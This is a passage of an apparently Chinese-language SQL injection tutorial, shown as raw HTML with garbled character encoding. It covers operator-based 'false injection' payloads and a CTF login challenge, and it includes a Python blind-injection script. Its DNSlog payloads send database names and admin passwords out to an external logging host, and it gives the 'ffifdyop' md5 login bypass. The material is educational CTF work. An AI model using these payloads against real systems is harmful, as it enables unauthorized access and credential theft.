class="string">&#x27;%1#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;</span><span class="string">&#x27;%1#&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨ä½æ“ä½œè¿ç®—<br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿ç®—çš„æ—¶å€™ç±»å‹è½¬æ¢çš„é—®é¢˜è¿›è¡Œåˆ©ç”¨ã€‚<br>å’Œè¿ç®—ï¼š&amp;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;&amp;0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;</span><span class="string">&#x27;&amp;0#&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>æˆ–è¿ç®—ï¼š|</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;|0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;</span><span class="string">&#x27;|0#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å¼‚æˆ–è¿ç®—ï¼š^</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;^0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;</span><span class="string">&#x27;^0#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç§»ä½æ“ä½œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;&lt;&lt;0# æˆ– &#x27;</span>&gt;&gt;0<span class="comment">#, æ‹¼æ¥çš„è¯­å¥: </span></span><br><span class="line">select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>&lt;&lt;<span class="string">0#&#x27;;</span></span><br><span class="line"><span class="string">select * from user where username =&#x27;&#x27;&gt;&gt;0</span><span class="comment">#&#x27;;  </span></span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨æ¯”è¾ƒè¿ç®—ç¬¦<br>å®‰å…¨ç­‰äºï¼š&lt;&#x3D;&gt;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;=0&lt;=&gt;1# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=&#x27;</span><span class="string">&#x27;=0&lt;=&gt;1#&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¸ç­‰äº&lt;&gt;(!&#x3D;)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;=0&lt;&gt;0# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=&#x27;</span><span class="string">&#x27;=0&lt;&gt;0#&#x27;</span></span><br></pre></td></tr></table></figure><p>å¤§å°äº&gt;æˆ–&lt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;-1# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=&#x27;</span><span class="string">&#x27;&gt;-1#</span></span><br></pre></td></tr></table></figure><ul><li><p>å…¶ä»–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+1 is not null<span class="comment">#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span></span><br></pre></td></tr></table></figure></li><li><p>ç»¼åˆåˆ©ç”¨<br>falseæ³¨å…¥è¿™ç§æ³¨å…¥æ–¹å¼æœ‰çš„ä¼˜åŠ¿å°±æ˜¯ï¼Œåœ¨æŸäº›ç‰¹å®šæ—¶å€™å¯ä»¥ç»•è¿‡WAFæˆ–è€…æ˜¯ä¸€äº›å…¶ä»–çš„ç»•è¿‡ã€‚</p></li></ul><p>è¿™é‡Œä¸¾ä¾‹ä¸€é“é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);  </span><br><span class="line"><span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span>(<span class="params"><span class="variable">$lenth</span>=<span class="number">32</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$strBase</span> = <span class="string">&quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line">     <span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">     <span class="keyword">while</span>(<span class="variable">$lenth</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$strBase</span>,<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$strBase</span>)-<span class="number">1</span>),<span class="number">1</span>);</span><br><span class="line">       <span class="variable">$lenth</span> --;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$install</span>)&#123;</span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">        <span class="variable">$sql</span>  = <span class="string">&quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">randStr</span>()).<span class="string">&quot;&#x27;,&#x27;admin&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t input this illegal char!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select role from `user` where username =&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span> is &quot;</span>.<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t have this user!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">     <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">     <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$username</span>));</span><br><span class="line">     <span class="variable">$passwd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$passwd</span>));</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t login this as admin!&quot;</span>);</span><br><span class="line">     &#125;  </span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where username=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and passwd=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$passwd</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">     <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) <span class="keyword">exit</span>(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;sorry,username or passwd error!&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$passwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]):<span class="string">&quot;source&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;source&quot;</span>: <span class="title function_ invoke__">source</span>(); <span class="keyword">break</span> ;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;login&quot;</span> : <span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$passwd</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;show&quot;</span> : <span class="title function_ invoke__">show</span>(<span class="variable">$username</span>);<span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°filter()å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.urldecode(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹èµ·æ¥è¿‡æ»¤çš„æ¯”è¾ƒå¤šï¼Œå…¶ä¸­andï¼Œorè¿˜æœ‰&amp;ï¼Œ|éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨falseè¿›è¡Œç›²æ³¨ã€‚</p><p>å¯ä»¥åœ¨showå‡½æ•°åˆ©ç”¨æŸ¥è¯¢çš„æ—¶å€™æ³¨å…¥ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå®˜æ–¹ç»™å‡ºçš„å°±æ˜¯åˆ©ç”¨å¼‚æˆ–ï¼Œå…¶å®è¿™é‡Œå¹¶ä¸éœ€è¦ admin åªè¦æ˜¯ä¸€ä¸²å­—ç¬¦ä¸²å°±å¯ä»¥</p><p>å¼‚æˆ–ä¼šä½¿å­—ç¬¦ä¸²éƒ½è½¬ä¸ºæµ®ç‚¹å‹ï¼Œéƒ½å˜ä¸ºäº†0ï¼Œç”±äº0&#x3D;0^0 -&gt; 1^0 -&gt; 1 å½“ç„¶å¯¹äºè¿™ä¸ªé¢˜å¹¶ä¸ä¸€å®šåˆ©ç”¨è¿™ä¸ªï¼Œç›´æ¥æˆªå–å­—ç¬¦ä¸²ä½œæ¯”è¾ƒå°±å¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œåªæ˜¯æä¾›ä¸€ç§å§¿åŠ¿ï¼Œç”±äºmysqlçš„çµæ´»ï¼Œå…¶èŠ±æ ·ä¹Ÿæ¯”è¾ƒå¤šè¿˜æœ‰å°±æ˜¯æ„é€ çš„payloadæ¯”è¾ƒç®€çŸ­ï¼Œä¾‹å¦‚â€™+â€™ã€â€™^â€™ã€â€™&#x2F;4#â€™ è¿™æ ·åªæœ‰ä¸‰ä¸ªå­—ç¬¦ä¾¿å¯ä»¥ç»•è¿‡ç™»å½•ï¼Œç®€å•ç²—æš´ï¼Œè¿˜æœ‰å°±æ˜¯ç±»ä¼¼çš„æ–‡ç« ä¸å¤šï¼Œè®¸å¤šå¼€å‘äººå‘˜å®¹æ˜“å¿½è§†è¿™äº›ç»†èŠ‚ã€‚</p><p><strong>ç›²æ³¨è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">str</span>+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = <span class="built_in">str</span>+flag</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="DNSæ³¨å…¥"><a href="#DNSæ³¨å…¥" class="headerlink" title="DNSæ³¨å…¥"></a>DNSæ³¨å…¥</h3><p><strong>åŸç†</strong><br>é€šè¿‡å­æŸ¥è¯¢ï¼Œå°†å†…å®¹æ‹¼æ¥åˆ°åŸŸåå†…ï¼Œè®©load_file()å»è®¿é—®å…±äº«æ–‡ä»¶ï¼Œè®¿é—®çš„åŸŸåè¢«è®°å½•æ­¤æ—¶å˜ä¸ºæ˜¾é”™æ³¨å…¥,å°†ç›²æ³¨å˜æ˜¾é”™æ³¨å…¥,è¯»å–è¿œç¨‹å…±äº«æ–‡ä»¶ï¼Œé€šè¿‡æ‹¼æ¥å‡ºå‡½æ•°åšæŸ¥è¯¢,æ‹¼æ¥åˆ°åŸŸåä¸­ï¼Œè®¿é—®æ—¶å°†è®¿é—®æœåŠ¡å™¨ï¼Œè®°å½•åæŸ¥çœ‹æ—¥å¿—ã€‚</p><p>åœ¨æ— æ³•ç›´æ¥åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡DNSè¯·æ±‚,é€šè¿‡DNSlogï¼ŒæŠŠæ•°æ®å¤–å¸¦ï¼Œç”¨DNSè§£æè®°å½•æŸ¥çœ‹ã€‚</p><p>LOAD_FILE() è¯»å–æ–‡ä»¶çš„å‡½æ•°<br>è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetï¼ˆé™åˆ¶serveræ¥å—çš„æ•°æ®åŒ…å¤§å°å‡½æ•°ï¼Œé»˜è®¤1MBï¼‰ã€‚ å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚</p><p>æ³¨ï¼šè¿™ä¸ªåŠŸèƒ½ä¸æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œéœ€è¦åœ¨mysqlé…ç½®æ–‡ä»¶åŠ ä¸€å¥ secure_file_priv&#x3D;</p><p><strong>DNSLOGå¹³å°</strong>:<br><a href="https://dns.å’•.com/">https://dns.xn--9tr.com/</a></p><p><a href="https://log.å’•.com/">https://log.xn--9tr.com/</a></p><p><strong>UNCè·¯å¾„</strong><br>UNCè·¯å¾„é€šç”¨å‘½åè§„åˆ™ï¼Œä¹Ÿç§°é€šç”¨å‘½åè§„èŒƒã€é€šç”¨å‘½åçº¦å®šï¼Œç±»ä¼¼\softerè¿™æ ·çš„å½¢å¼çš„ç½‘ç»œè·¯å¾„ã€‚</p><p>UNCè·¯å¾„çš„ æ ¼å¼ ï¼š\server\sharename\directory\filename</p><p>ç­‰åŒäºSELECT LOAD_FILE(â€˜&#x2F;&#x2F;åº“å.1806dl.dnslog.cn&#x2F;abcâ€™</p><p>å»è®¿é—® åº“å.1806dl.dnslog.cn çš„æœåŠ¡å™¨ä¸‹çš„å…±äº«æ–‡ä»¶å¤¹abcã€‚</p><p>ç„¶å1806dl.dnslog.cnçš„å­åŸŸåçš„è§£æéƒ½æ˜¯åœ¨æŸå°æœåŠ¡å™¨ï¼Œç„¶åä»–è®°å½•ä¸‹æ¥äº†æœ‰äººè¯·æ±‚è®¿é—®äº†error.1806dl.dnslog.cnï¼Œç„¶ååœ¨DnsLogè¿™ä¸ªå¹³å°ä¸Šé¢æ˜¾ç¤ºå‡ºæ¥äº†</p><p>payloadç¤ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>, database(),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>, (select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1 ),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>,(select column_name from information_schema.columns <span class="built_in">where</span> table_name=â€™adminâ€™ and table_schema=database() <span class="built_in">limit</span> 2,1),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>,(select password from admin <span class="built_in">limit</span> 0,1),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="â€˜â€œ-md5-pass-true-â€â€˜-ç™»å½•ç»•è¿‡"><a href="#â€˜â€œ-md5-pass-true-â€â€˜-ç™»å½•ç»•è¿‡" class="headerlink" title="â€˜â€œ.md5($pass,true).â€â€˜ ç™»å½•ç»•è¿‡"></a>â€˜â€œ.md5($pass,true).â€â€˜ ç™»å½•ç»•è¿‡</h3><p>å¾ˆå¤šç«™ç‚¹ä¸ºäº†å®‰å…¨éƒ½ä¼šåˆ©ç”¨è¿™æ ·çš„è¯­å¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE password = <span class="string">&#x27;.md5($password,true).&#x27;</span>;</span><br></pre></td></tr></table></figure><p>md5(string,true) å‡½æ•°åœ¨æŒ‡å®šäº†trueçš„æ—¶å€™ï¼Œæ˜¯è¿”å›çš„åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè¿”å›è¿™æ ·å­çš„å­—ç¬¦ä¸²ï¼šâ€™orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1cï¼š<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png"></p><p>è¿™ä¸æ˜¯æ™®é€šçš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ â€˜orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1c è¿™ç§ï¼Œè¿™æ ·çš„è¯å°±ä¼šå’Œå‰é¢çš„å½¢æˆé—­åˆï¼Œæ„æˆä¸‡èƒ½å¯†ç ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE password = <span class="string">&#x27;&#x27;</span>or<span class="string">&#x27;6.......&#x27;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆ 6\xc9]\x99\xe9!r,\xf9\xedb\x1c çš„å¸ƒå°”å€¼æ˜¯trueå‘¢ï¼Ÿ</p><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ï¼ˆè¿™ç±»ä¼¼äºPHPçš„å¼±ç±»å‹ï¼‰ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚ password&#x3D;â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äº password&#x3D;â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚è¿™é‡Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚ password&#x3D;â€˜xxxâ€™ or 1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯ trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°è¿™æ ·å­çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œç»™å‡ºä¸¤ä¸ªå§ã€‚</p><p>ffifdyopï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: <span class="string">&#x27;or&#x27;</span>6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: <span class="string">&#x27;or&#x27;</span>6]!r,b</span><br></pre></td></tr></table></figure><p>129581926211651571912466741651878684928ï¼š</p><figure class="highlight bash"><table><tr><td 